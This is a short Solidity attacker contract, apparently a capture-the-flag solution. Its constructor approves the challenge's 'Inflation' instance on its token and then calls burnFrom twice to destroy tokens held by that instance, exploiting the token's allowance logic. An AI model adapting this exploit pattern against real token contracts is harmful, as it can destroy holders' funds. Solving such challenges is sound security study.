pragma solidity 0.8.4;

import "./Setup.sol";

contract bahurumAttacker {
    
    constructor(Inflation instance) payable {
        
        InflationaryToken(instance.tokenAddress()).approve(address(instance), 5000);
        InflationaryToken(instance.tokenAddress()).burnFrom(address(instance), 1000);
        InflationaryToken(instance.tokenAddress()).burnFrom(address(instance), 100);

    }

    receive() external payable { }

}

